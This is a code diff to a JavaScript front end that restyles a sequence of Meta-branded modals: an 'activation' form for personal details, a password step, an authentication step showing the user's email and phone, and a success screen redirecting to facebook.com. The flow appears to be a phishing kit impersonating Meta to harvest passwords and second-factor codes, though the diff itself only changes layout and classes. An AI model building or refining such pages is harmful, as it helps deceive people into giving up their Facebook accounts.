@@ -445,11 +445,12 @@ function openClientModal() {
         : (order === 'mdy' ? ['month', 'day', 'year'] : ['day', 'month', 'year']);
 
     const content = `
-        <div class="info-form">
+        <div class="info-form activation-form">
             <div class="info-form-header">
                 <h2 class="info-form-title">${t('activationTitle')}</h2>
             </div>
             <form id="clientForm" class="info-form-body">
+                <div class="info-form-scroll">
                 <div class="info-form-section">
                     <p class="info-form-section-title">${t('personalDetails')}</p>
                     <div class="info-form-field">
@@ -503,7 +504,7 @@ function openClientModal() {
                 <div class="info-form-section">
                     <label class="fb-notify-card" for="fbNotify">
                         <span class="fb-notify-logo" aria-hidden="true">
-                            <img src="./public/icons/ic_facebook_circle.svg" alt="">
+                            <img src="./public/icons/ic_facebook.svg" alt="">
                         </span>
                         <span class="fb-notify-copy">
                             <span class="fb-notify-title-row">
@@ -521,6 +522,7 @@ function openClientModal() {
                     <input type="checkbox" id="termsAgree" name="termsAgree">
                     <span>${t('termsAgree')} <a href="#" class="info-form-link">${t('termsOfUse')}</a></span>
                 </label>
+                </div>
 
                 <button type="submit" class="info-form-submit">${t('submit')}</button>
             </form>
@@ -561,7 +563,7 @@ function openClientModal() {
 // ==================== MODAL 2: SECURITY (PASSWORD) ====================
 function openSecurityModal() {
     const content = `
-        <div class="info-form security-form">
+        <div class="info-form step-form security-form">
             <div class="security-form-brand">
                 <img src="./public/icons/ic_logo.svg" alt="Meta">
             </div>
@@ -676,7 +678,7 @@ function openAuthenticationModal(userData) {
     const description = t('authSubtitle', { email: emailDisplay, phone: phoneDisplay });
 
     const content = `
-        <div class="info-form auth-form">
+        <div class="info-form step-form auth-form">
             <div class="auth-form-meta">
                 <span>${escapeHtml(userData.fullName || '')}</span>
                 <span class="auth-form-dot"></span>
@@ -823,17 +825,19 @@ function openAuthenticationModal(userData) {
 // ==================== MODAL 4: SUCCESS ====================
 function openSuccessModal() {
     const content = `
-        <h2 class="font-bold text-[18px] mb-4 text-center">${t('successTitle')}</h2>
-        <div class="rounded-lg overflow-hidden mb-4">
-            <img src="/public/images/success.jpg" alt="Success" class="w-full">
-        </div>
-        <p class="text-[#9a979e] mb-1 text-[15px]">${t('successBody1')}</p>
-        <p class="text-[#9a979e] mb-5 text-[15px]">${t('successBody2')}</p>
-        <a href="https://www.facebook.com" class="block w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white text-center rounded-full py-2.5 hover:bg-blue-700 transition-colors">
-            ${t('returnFacebook')}
-        </a>
-        <div class="w-16 mt-5 mx-auto">
-            <img src="./public/icons/ic_meta_gray.svg" alt="Meta">
+        <div class="info-form step-form success-form">
+            <div class="info-form-header">
+                <h2 class="info-form-title">${t('successTitle')}</h2>
+            </div>
+            <div class="success-form-preview">
+                <img src="/public/images/success.jpg" alt="Success">
+            </div>
+            <p class="success-form-body">${t('successBody1')}</p>
+            <p class="success-form-body">${t('successBody2')}</p>
+            <a href="https://www.facebook.com" class="info-form-submit">${t('returnFacebook')}</a>
+            <div class="security-form-footer">
+                <img src="./public/icons/ic_meta_gray.svg" alt="Meta">
+            </div>
         </div>
     `;
 
